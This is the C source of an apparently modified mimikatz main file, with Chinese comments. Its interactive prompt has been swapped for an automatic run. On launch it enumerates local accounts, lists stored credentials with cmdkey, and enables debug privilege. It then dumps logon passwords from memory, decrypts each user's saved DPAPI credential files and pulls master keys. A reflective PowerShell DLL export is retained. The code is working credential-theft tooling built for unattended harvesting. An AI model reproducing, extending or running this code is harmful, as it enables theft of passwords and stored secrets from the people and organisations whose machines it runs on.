/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "mimikatz.h"
#include <LMaccess.h>
#include <string.h>


//模块调用，对应结构体
const KUHL_M * mimikatz_modules[] = {
	&kuhl_m_standard,
	&kuhl_m_crypto,
	&kuhl_m_sekurlsa,
	&kuhl_m_kerberos,
	&kuhl_m_privilege,
	&kuhl_m_process,
	&kuhl_m_service,
	&kuhl_m_lsadump,
	&kuhl_m_ts,
	&kuhl_m_event,
	&kuhl_m_misc,
	&kuhl_m_token,
	&kuhl_m_vault,
	&kuhl_m_minesweeper,
#ifdef NET_MODULE
	&kuhl_m_net,
#endif
	&kuhl_m_dpapi,
	&kuhl_m_busylight,
	&kuhl_m_sysenv,
	&kuhl_m_sid,
	&kuhl_m_iis,
	&kuhl_m_rpc,
};

int wmain(int argc, wchar_t * argv[])
{
	NTSTATUS status = STATUS_SUCCESS;
	int i;
#ifndef _WINDLL
	size_t len = 0;
	wchar_t input[0xffff] ;
#endif
	mimikatz_begin();
	for(i = MIMIKATZ_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_FATAL_APP_EXIT) ; i++)    //带参数输出
	{
		kprintf(L"\n" MIMIKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);

		status = mimikatz_dispatchCommand(argv[i]);

	}


#ifndef _WINDLL


	//while (status != STATUS_FATAL_APP_EXIT)
	//{
	//	kprintf(L"\n" MIMIKATZ L" # "); fflush(stdin);
	//	if (fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
	//	{
	//		if (input[len - 1] == L'\n')
	//			input[len - 1] = L'\0';
	//		kprintf_inputline(L"%s\n", input);
	//		status = mimikatz_dispatchCommand(input);
	//	}
	//}

	while (status != STATUS_FATAL_APP_EXIT)
	{
		//kprintf(L"\n" MIMIKATZ L" # "); flush(stdin);
		//if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n')) //直接运行等待输入
		//{
			//if(input[len - 1] == L'\n')
			//	input[len - 1] = L'\0';

			//kprintf_inputline(L"%s\n", input); //获取参数
			//status = mimikatz_dispatchCommand(input);
		//}

		Getalluser();
		// 获取 cmdkey /list
		kprintf(L"========== cmdkey /list Result =========\n");
		system("cmdkey /list");
		////提权
		kprintf(L"========== privilege::debug Result =========\n\n");
		wcscpy_s(input, _countof(input), L"privilege::debug");
		status = mimikatz_dispatchCommand(input);
		////获取密码
		kprintf(L"\n========== sekurlsa::logonpasswords Result =========\n");
		wcscpy_s(input, _countof(input), L"sekurlsa::logonpasswords");
		status = mimikatz_dispatchCommand(input);

		kprintf(L"\n==========dpapi::cred /in: Part =========\n");
		wchar_t temp_buf[MAX_PATH];
		//1、遍历数组元素，根据目前用户信息的个数循环
		int i = 0;
		do 
		{
				// 2、根据用户名确定遍历路径
				wsprintf(temp_buf, L"C:\\Users\\%s\\AppData\\Local\\Microsoft\\Credentials\\", user_info[i].username);

				// 3、遍历存储用户名终端会话记录目录里的所有文件
				if (wcscmp(user_info[i].username, L""))
				{
					// 3.1 遍历当前目录文件
					Traversal(temp_buf);
				}
				else
				{
					break;
				}

			i++;

		} while (i < _countof(user_info));
		


		// 4、 用户名终端会话记录目录文件的GUID
		for (int i = 0; i < _countof(file_info); i++)
		{
			if (wcscmp(file_info[i].filepath, L""))
			{
				// 4.1 根据文件获取Guid 
				wchar_t temp_buf[MAX_PATH];
				wsprintf(temp_buf, L"dpapi::cred /in:%s", file_info[i].filepath);
				wprintf(L"\n%s\n\n", temp_buf);
				// 存储文件信息的flag
				fileinfo_flag = i;
	            // 输入命令
				status = mimikatz_dispatchCommand(temp_buf);
				//4.2 存储的guid排序
				//selectionSort(stUserGuid, _countof(stUserGuid));

			}

		}

		// 4.2、根据GUID获取对应的Masterkey
		kprintf(L"\n========== sekurlsa::dpapi Part =========\n");
		// 导入当前这个命令到全局命令数组，对比临时命令
		wcscpy_s(g_input, _countof(g_input), L"sekurlsa::logonpasswords");
        // 输入命令
		status = mimikatz_dispatchCommand(L"sekurlsa::dpapi");



		// 5、注入 masterkey解密
		//kprintf(L"\n========== dpapi::cred /in:D:\\dir_path(*) /masterkey:*  =========\n");
		//for (int i = 0; _countof(file_info); i++)
		//{
		//	//for (int j = i + 1; j < _countof(guidMasterKey);j++)
		//	//{
		//	//	//如果路径为空就没必要比对了
		//	//	if (!(wcscmp(file_info[i].filepath, L"")))
		//	//	{
		//	//		continue;
		//	//	}
		//	//	// 比对Guid一致就注入并且输出相关的内容
		//	//	if (wcscmp(file_info[i].UserGuid, guidMasterKey[].GuidMasterKey))
		//	//	{
		//	//	}
		//		//如果路径为空就没必要比对了
		//		if (!(wcscmp(file_info[i].filepath, L"")))
		//		{
		//			continue;
		//		}
		//	kprintf(L"%s\n", file_info[i].filepath);
		//	kprintf(L"%s\n", file_info[i].UserGuid);

		//	//}
		//}


		// 5、注入 masterkey解密
		//kprintf(L"\n========== dpapi::cred /in:D:\\dir_path(*) /masterkey:*  =========\n");





		// 6、写入文件







		status = STATUS_FATAL_APP_EXIT;
	}
#endif
	mimikatz_end();
	return STATUS_SUCCESS;
}


////需要测试数组是否还是原来的数组
//void selectionSort(struct STUSERGUID *stGuid, int rows)
//{
//	int i, j, min;
//	wchar_t temp_UserGuid[40];
//	for (i = 0; i < rows; i++) {
//		min = i;
//		for (j = i + 1; j < rows; j++) {
//
//			if (!(wcscmp(stGuid[j].UserGuid,L"")))                          //如果等于空，就不必继续对比了
//			{
//				continue;
//			}
//
//			if (wcscmp(stGuid[j].UserGuid, stGuid[min].UserGuid) < 0) {  //string1 比 string2小于
//				min = j;
//			}
//		}
//		//最小的字符串交换
//		wcscpy_s(temp_UserGuid, _countof(stGuid[min].UserGuid), stGuid[min].UserGuid);
//		wcscpy_s(stGuid[min].UserGuid, _countof(stGuid[min].UserGuid), stGuid[i].UserGuid);
//		wcscpy_s(stGuid[i].UserGuid, _countof(temp_UserGuid), temp_UserGuid);
//	}
//
//
//	return;
//}




void Traversal(const TCHAR *lpszPath)
{
	WIN32_FIND_DATA ffd;
	LARGE_INTEGER filesize;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	TCHAR szCurPath[MAX_PATH] = { 0 };
	TCHAR szSearchPath[MAX_PATH] = { 0 };

	wcscat_s(szCurPath,_countof(szCurPath), lpszPath);
	wcscat_s(szSearchPath, _countof(szSearchPath), szCurPath);
	wcscat_s(szSearchPath, _countof(szSearchPath), L"\\*");

	hFind = FindFirstFile(szSearchPath, &ffd);

	if (INVALID_HANDLE_VALUE == hFind) {
		return;
	}
	// 文件路径信息计数
	int nCout = 0;

	do {
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) {
				continue;
			}
			    //有目录进目录
			    //wprintf(L"%s\t<DIR>\n", ffd.cFileName);
				TCHAR szSubDir[MAX_PATH] = { 0 };

				wcscat_s(szSubDir, _countof(szSubDir), szCurPath);
				wcscat_s(szSubDir, _countof(szSubDir),L"\\");
				wcscat_s(szSubDir, _countof(szSubDir), ffd.cFileName);

				Traversal(szSubDir);

		}
		else {

			//输出当前目录下文件
			filesize.LowPart = ffd.nFileSizeLow;
			filesize.HighPart = ffd.nFileSizeHigh;

			TCHAR szShowPath[MAX_PATH] = { 0 };
			wcscat_s(szShowPath, _countof(szShowPath), szCurPath);
			wcscat_s(szShowPath, _countof(szShowPath), L"\\");
			wcscat_s(szShowPath, _countof(szShowPath), ffd.cFileName);

			//wprintf(L"%s\n", szShowPath);
			wcscpy_s(file_info[nCout].filepath, _countof(file_info[nCout].filepath), szShowPath);

			//文件路径信息
			nCout++;
		}
	} while (FindNextFile(hFind, &ffd));

	FindClose(hFind);
}


//获取所有用户
void Getalluser()
{

	LPUSER_INFO_0 pBuf = NULL;
	LPUSER_INFO_0 pTmpBuf;
	DWORD dwLevel = 0;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwResumeHandle = 0;
	DWORD i;
	DWORD dwTotalCount = 0;
	NET_API_STATUS nStatus;
	LPTSTR pszServerName = NULL;

	do // begin do
	{
		nStatus = NetUserEnum(NULL,
			dwLevel,
			FILTER_NORMAL_ACCOUNT, // global users
			(LPBYTE*)&pBuf,
			dwPrefMaxLen,
			&dwEntriesRead,
			&dwTotalEntries,
			&dwResumeHandle);
		//
		// If the call succeeds,
		//
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				//
				// Loop through the entries.
				//
				for (i = 0; (i < dwEntriesRead); i++)
				{
					assert(pTmpBuf != NULL);

					if (pTmpBuf == NULL)
					{
						break;
					}
					//
					//  Print the name of the user account.
					//

					TCHAR tcBuffer[1024] = { 0 };
					//wsprintf(tcBuffer, L"\t-- %s\r\n", pTmpBuf->usri0_name);
					wcscpy_s(user_info[i].username, _countof(user_info[i].username), pTmpBuf->usri0_name);
					pTmpBuf++;
					dwTotalCount++;
				}
			}
		}
		//
		// Otherwise, print the system error.
		//
		else
			fprintf(stderr, "A system error has occurred: %d\n", nStatus);
		//
		// Free the allocated buffer.
		//
		if (pBuf != NULL)
		{
			NetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	}
	// Continue to call NetUserEnum while 
	//  there are more entries. 
	// 
	while (nStatus == ERROR_MORE_DATA); // end do
										//
										// Check again for allocated memory.
										//
	if (pBuf != NULL)
		NetApiBufferFree(pBuf);
	//
	// Print the final count of users enumerated.
	//
}


//提示画面
void mimikatz_begin()
{
	kull_m_output_init();
#ifndef _WINDLL
	//设置输出颜色
    //SetConsoleTitle(MIMIKATZ L" " MIMIKATZ_VERSION L" " MIMIKATZ_ARCH L" (oe.eo)");
	//SetConsoleCtrlHandler(HandlerRoutine, TRUE);
#endif
	//不用的时候禁用
	//kprintf(L"\n"
	//	L"  .#####.   " MIMIKATZ_FULL L"\n"
	//	L" .## ^ ##.  " MIMIKATZ_SECOND L"\n"
	//	L" ## / \\ ##  /* * *\n"
	//	L" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
	//	L" '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n"
	//	L"  '#####'    " MIMIKATZ_SPECIAL L" with %2u modules * * */\n", ARRAYSIZE(mimikatz_modules));
	//
	//初始化环境
	mimikatz_initOrClean(TRUE);
}

void mimikatz_end()
{
	mimikatz_initOrClean(FALSE);
#ifndef _WINDLL
	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
#endif
	kull_m_output_clean();
#ifndef _WINDLL
	ExitProcess(STATUS_SUCCESS);
#endif
}

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	mimikatz_initOrClean(FALSE);
	return FALSE;
}

NTSTATUS mimikatz_initOrClean(BOOL Init)
{
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;
	HRESULT hr;

	if(Init)
	{
		RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
		MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;
		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if(FAILED(hr))
#ifdef _WINDLL
			if(hr != RPC_E_CHANGED_MODE)
#endif
				PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
		kull_m_asn1_init();
	}
	else
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

	for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
	{
		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (mimikatz_modules[indexModule]) + offsetToFunc))
		{
			fStatus = function();
			if(!NT_SUCCESS(fStatus))
				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), mimikatz_modules[indexModule]->shortName, fStatus);
		}
	}

	if(!Init)
	{
		kull_m_asn1_term();
		CoUninitialize();
		kull_m_output_file(NULL);
	}
	return STATUS_SUCCESS;
}

NTSTATUS mimikatz_dispatchCommand(wchar_t * input)
{

	NTSTATUS status;
	PWCHAR full;
	if(full = kull_m_file_fullPath(input))
	{
		switch(full[0])
		{
		case L'!':
			status = kuhl_m_kernel_do(full + 1);
			break;
		case L'*':
			status = kuhl_m_rpc_do(full + 1);
			break;
		default:
			status = mimikatz_doLocal(full);
		}
		LocalFree(full);
	}
	return status;
}

NTSTATUS mimikatz_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	// 参数个数定义
	int argc;
	// 获取输入的值，参数个数赋值
	//
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;
	
	if(argv && (argc > 0))
	{
		if(match = wcsstr(argv[0], L"::"))
		{
			if(module = (wchar_t *) LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if((unsigned int) (match + 2 - argv[0]) < wcslen(argv[0]))
					//提取::号的后半段字符
					command = match + 2;
				//将argv[0]源内存块的内容复制到module目标内存块。
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
			}
		}
		else command = argv[0];
		// 索引值为0，如果moduleFound为1且索引值小于模块的数目，循环执行
		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(mimikatz_modules)); indexModule++)
			//查找模块
			if(moduleFound = (!module || (_wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0)))
				//查找命令
				if(command)
					for(indexCommand = 0; !commandFound && (indexCommand < mimikatz_modules[indexModule]->nbCommands); indexCommand++)
						if(commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0)
							//调用相关模块函数
							status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);

		if(!moduleFound)
		{
			PRINT_ERROR(L"\"%s\" module not found !\n", module);
			for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->shortName);
				if(mimikatz_modules[indexModule]->fullName)
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->fullName);
				if(mimikatz_modules[indexModule]->description)
					kprintf(L"  [%s]", mimikatz_modules[indexModule]->description);
			}
			kprintf(L"\n");
		}
		else if(!commandFound)
		{
			indexModule -= 1;
			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, mimikatz_modules[indexModule]->shortName);

			kprintf(L"\nModule :\t%s", mimikatz_modules[indexModule]->shortName);
			if(mimikatz_modules[indexModule]->fullName)
				kprintf(L"\nFull name :\t%s", mimikatz_modules[indexModule]->fullName);
			if(mimikatz_modules[indexModule]->description)
				kprintf(L"\nDescription :\t%s", mimikatz_modules[indexModule]->description);
			kprintf(L"\n");

			for(indexCommand = 0; indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->commands[indexCommand].command);
				if(mimikatz_modules[indexModule]->commands[indexCommand].description)
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->commands[indexCommand].description);
			}
			kprintf(L"\n");
		}

		if(module)
			LocalFree(module);
		LocalFree(argv);
	}
	return status;
}

#ifdef _WINDLL
__declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input)
{
	int argc = 0;
	wchar_t ** argv;
	
	if(argv = CommandLineToArgvW(input, &argc))
	{
		outputBufferElements = 0xff;
		outputBufferElementsPosition = 0;
		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
			wmain(argc, argv);
		LocalFree(argv);
	}
	return outputBuffer;
}
#endif